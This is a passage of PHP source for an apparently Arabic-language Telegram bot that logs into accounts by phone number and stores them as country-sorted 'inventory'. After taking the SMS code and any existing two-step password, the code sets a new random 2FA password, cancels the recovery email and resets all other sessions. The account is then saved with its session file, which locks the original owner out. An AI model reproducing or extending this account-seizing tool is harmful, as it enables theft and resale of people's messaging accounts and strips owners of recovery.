🔓 <b>تم تسجيل الخروج بنجاح</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الرقم: " . formatPhone($acc['phone']) . "
🗑️ تم إزالة الحساب من المخزون
" . formatDate(), '✅');
            sendMessage($chat_id, $msg);
            editMessage($chat_id, $msg_id, fancyMessage('🚫 حساب غير متوفر', "
⚠️ <b>هذا الحساب تم تسجيل الخروج منه</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ غير متوفر بعد الآن
" . formatDate(), '🚫'));
        } else {
            $msg = fancyMessage('⚠️ خطأ', "الحساب غير موجود.", '⚠️');
            sendMessage($chat_id, $msg);
        }
        exit;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📝 معالجة الرسائل النصية
// ═══════════════════════════════════════════════════════════════════════════

if ($message && !$callback) {
    $text = trim($message['text'] ?? '');
    $stmt = $db->prepare("SELECT * FROM activation_sessions WHERE admin_id=? ORDER BY created_at DESC LIMIT 1");
    $stmt->execute([$user_id]);
    $session = $stmt->fetch(PDO::FETCH_ASSOC);
    
    // ========== إضافة دولة جديدة - استقبال الاسم ==========
    if ($session && $session['step'] === 'add_country_name') {
        $countryName = trim($text);
        if (strlen($countryName) < 2) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "اسم الدولة قصير جداً. أرسل اسم صحيح.", '❌'));
            exit;
        }
        
        $stmt = $db->prepare("UPDATE activation_sessions SET phone=?, step='add_country_code' WHERE admin_id=?");
        $stmt->execute([$countryName, $user_id]);
        
        $msg = fancyMessage('➕ إضافة دولة جديدة', "
📝 <b>الخطوة 2 من 3</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 <b>الدولة:</b> $countryName
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔢 <b>أرسل رمز الدولة</b> (أرقام فقط)
📱 مثال: <code>66</code> لتايلاند
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ الرمز يجب أن يكون من 1 إلى 4 أرقام
" . formatDate(), '➕');
        sendMessage($chat_id, $msg);
        exit;
    }
    
    // ========== إضافة دولة جديدة - استقبال الرمز ==========
    elseif ($session && $session['step'] === 'add_country_code') {
        $countryCode = trim($text);
        if (!preg_match('/^\d{1,4}$/', $countryCode)) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "رمز الدولة غير صالح.\nأرسل أرقام فقط (1-4 أرقام).\nمثال: <code>66</code>", '❌'));
            exit;
        }
        
        $stmt = $db->prepare("SELECT COUNT(*) FROM countries WHERE code = ?");
        $stmt->execute([$countryCode]);
        if ($stmt->fetchColumn() > 0) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "رمز الدولة $countryCode موجود بالفعل!\nاستخدم رمز آخر أو قم بتحديث الدولة الموجودة.", '❌'));
            exit;
        }
        
        $countryName = $session['phone'];
        $stmt = $db->prepare("UPDATE activation_sessions SET country_code=?, step='add_country_flag' WHERE admin_id=?");
        $stmt->execute([$countryCode, $user_id]);
        
        $msg = fancyMessage('➕ إضافة دولة جديدة', "
📝 <b>الخطوة 3 من 3</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 <b>الدولة:</b> $countryName
🔢 <b>الرمز:</b> $countryCode
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 <b>أرسل علم الدولة</b> (إيموجي واحد أو أكثر)
📱 مثال: <code>🇹🇭</code> لتايلاند
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ يمكنك نسخ العلم من الإنترنت أو لوحة الرموز
" . formatDate(), '➕');
        sendMessage($chat_id, $msg);
        exit;
    }
    
    // ========== إضافة دولة جديدة - استقبال العلم ==========
    elseif ($session && $session['step'] === 'add_country_flag') {
        $flag = trim($text);
        if (!preg_match('/[\x{1F1E6}-\x{1F1FF}]/u', $flag)) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "العلم غير صالح.\nأرسل إيموجي علم صحيح.\nمثال: <code>🇹🇭</code>", '❌'));
            exit;
        }
        
        $countryName = $session['phone'];
        $countryCode = $session['country_code'];
        
        $stmt = $db->prepare("INSERT INTO countries (code, name, flag) VALUES (?, ?, ?)");
        $stmt->execute([$countryCode, $countryName, $flag]);
        
        $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
        
        $msg = fancyMessage('✅ تمت الإضافة بنجاح', "
🎉 <b>تم إضافة دولة جديدة</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 <b>العلم:</b> $flag
🌍 <b>الدولة:</b> $countryName
🔢 <b>الرمز:</b> <code>$countryCode</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ يمكنك الآن تخزين حسابات بهذه الدولة
" . formatDate(), '✅');
        sendMessage($chat_id, $msg);
        exit;
    }
    
    // ========== مرحلة إرسال الرقم للتخزين (المعدلة) ==========
    elseif ($session && $session['step'] === 'awaiting_phone' && preg_match('/^[\+\d]{8,20}$/', $text)) {
        $rawPhone = $text;
        
        // تنسيق الرقم بشكل موحد
        $phone = normalizePhone($rawPhone);
        
        $country = getCountryByPhone($phone, $db);
        
        if (!$country) {
            $msg = fancyMessage('❌ خطأ في الرقم', "
⚠️ <b>لم نتعرف على الدولة</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 <b>الصيغ المدعومة:</b>
• <code>+967XXXXXXXX</code>
• <code>00967XXXXXXXX</code>
• <code>967XXXXXXXX</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 <b>الرقم الذي أرسلته:</b> $rawPhone
📱 <b>بعد التنسيق:</b> $phone
🌍 <b>الدول المتاحة:</b> " . $db->query("SELECT COUNT(*) FROM countries")->fetchColumn() . " دولة
💡 <b>تأكد من أن رمز الدولة صحيح</b>
" . formatDate(), '❌');
            sendMessage($chat_id, $msg);
            exit;
        }
        
        // تحديث الجلسة بالرقم والدولة
        $stmt = $db->prepare("UPDATE activation_sessions SET phone=?, country_code=?, step='awaiting_code' WHERE admin_id=?");
        $stmt->execute([$phone, $country['code'], $user_id]);
        
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        
        try {
            $mad = new API($tempFile, $settings);
            $sentCode = $mad->phoneLogin($phone);
            $code_hash = $sentCode['phone_code_hash'];
            
            $stmt = $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?");
            $stmt->execute([$code_hash, $user_id]);
            
            $msg = fancyMessage('✅ تم إرسال الكود', "
📱 <b>تم إرسال كود التفعيل إلى الرقم:</b>
" . formatPhone($phone) . "
🌍 <b>الدولة:</b> {$country['flag']} {$country['name']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 <b>أرسل الكود الآن</b> (5-6 أرقام)
" . formatDate(), '✅');
            sendMessage($chat_id, $msg);
            
        } catch (Exception $e) {
            $msg = fancyMessage('❌ فشل الإرسال', "فشل إرسال الكود: " . $e->getMessage(), '❌');
            sendMessage($chat_id, $msg);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
        }
        exit;
    }
    
    // ========== مرحلة إدخال الكود ==========
    elseif ($session && $session['step'] === 'awaiting_code' && preg_match('/^\d{5,6}$/', $text)) {
        $phone = $session['phone'];
        $tempFile = $session['temp_file'];
        $code_hash = $session['code_hash'] ?? '';
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        
        try {
            $mad = new API($tempFile, $settings);
            $authorization = $mad->completePhoneLogin($text, $code_hash);
            
            if ($authorization['_'] === 'account.password') {
                $serializedFile = saveMadelineSerialized($mad, $phone);
                $stmt = $db->prepare("UPDATE activation_sessions SET step='awaiting_password', serialized_file=? WHERE admin_id=?");
                $stmt->execute([$serializedFile, $user_id]);
                
                $msg = fancyMessage('🔐 كلمة مرور خطوتين', "
⚠️ <b>هذا الحساب محمي بكلمة مرور خطوتين</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 <b>أرسل كلمة المرور القديمة</b>
" . formatDate(), '🔐');
                sendMessage($chat_id, $msg);
                exit;
            }
            
            $newPassword = bin2hex(random_bytes(8));
            try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
            try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
            try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
            try { $mad->logout(); } catch (Exception $e) {}
            
            $finalSession = SESSIONS_PATH . md5($phone) . '.madeline';
            if (file_exists($tempFile)) {
                rename($tempFile, $finalSession);
            }
            
            $stmt = $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')");
            $stmt->execute([$phone, $session['country_code'], $finalSession, $newPassword]);
            
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            
            $successMsg = fancyMessage('🎉 تم التخزين بنجاح 🎉', "
✅ <b>تم تخزين الحساب في قاعدة البيانات</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
" . formatPhone($phone) . "
🔐 <b>كلمة المرور الجديدة:</b> " . formatPassword($newPassword) . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>يرجى حفظ كلمة المرور في مكان آمن</i>
" . formatDate(), '🎉');
            sendMessage($chat_id, $successMsg);
            
        } catch (Exception $e) {
            if (strpos($e->getMessage(), 'PHONE_CODE_INVALID') !== false) {
                try {
                    $mad = new API($tempFile, $settings);
                    $newSent = $mad->phoneLogin($phone);
                    $newCodeHash = $newSent['phone_code_hash'];
                    $stmt = $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?");
                    $stmt->execute([$newCodeHash, $user_id]);
                    
                    $msg = fancyMessage('⚠️ كود غير صالح', "
⚠️ <b>الكود غير صالح أو انتهت صلاحيته</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 <b>تم إرسال كود جديد</b> إلى " . formatPhone($phone) . "
📝 أرسل الكود الجديد خلال 60 ثانية
" . formatDate(), '⚠️');
                    sendMessage($chat_id, $msg);
                    
                } catch (Exception $e2) {
                    $msg = fancyMessage('❌ فشل', "فشل إرسال كود جديد: " . $e2->getMessage(), '❌');
                    sendMessage($chat_id, $msg);
                }
            } else {
                $msg = fancyMessage('❌ فشل التحقق', "فشل التحقق من الكود: " . $e->getMessage(), '❌');
                sendMessage($chat_id, $msg);
            }
        }
        exit;
    }
    
    // ========== مرحلة إدخال كلمة المرور القديمة ==========
    elseif ($session && $session['step'] === 'awaiting_password') {
        $oldPass = $text;
        $serializedFile = $session['serialized_file'] ?? '';
        $mad = loadMadelineSerialized($serializedFile);
        
        if (!$mad) {
            $msg = fancyMessage('❌ خطأ في الجلسة', "خطأ في الجلسة، ابدأ من جديد.", '❌');
            sendMessage($chat_id, $msg);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            exit;
        }
        
        try {
            $authorization = $mad->complete2faLogin($oldPass);
            $newPassword = bin2hex(random_bytes(8));
            
            try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
            try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
            try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
            try { $mad->logout(); } catch (Exception $e) {}
            
            $finalSession = SESSIONS_PATH . md5($session['phone']) . '.madeline';
            $tempFile = $session['temp_file'];
            if (file_exists($tempFile)) {
                rename($tempFile, $finalSession);
            }
            
            $stmt = $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')");
            $stmt->execute([$session['phone'], $session['country_code'], $finalSession, $newPassword]);
            
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            
            $successMsg = fancyMessage('🎉 تم التخزين بنجاح 🎉', "
✅ <b>تم تخزين الحساب في قاعدة البيانات</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
" . formatPhone($session['phone']) . "
🔐 <b>كلمة المرور الجديدة:</b> " . formatPassword($newPassword) . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>يرجى حفظ كلمة المرور في مكان آمن</i>
" . formatDate(), '🎉');
            sendMessage($chat_id, $successMsg);
            
        } catch (Exception $e) {
            $msg = fancyMessage('❌ كلمة مرور خاطئة', "كلمة المرور غير صحيحة: " . $e->getMessage(), '❌');
            sendMessage($chat_id, $msg);
        }
        exit;
    }
    else {
        $msg = fancyMessage('⚠️ تنبيه', "
📝 <b>لبدء العمل، أرسل الأمر</b> <code>/start</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ أو اتبع الخطوات المطلوبة في العملية النشطة
💡 <b>لاختبار التعرف على الرقم أرسل:</b> <code>test +967XXXXXXXX</code>
" . formatDate(), '⚠️');
        sendMessage($chat_id, $msg);
    }
}
?>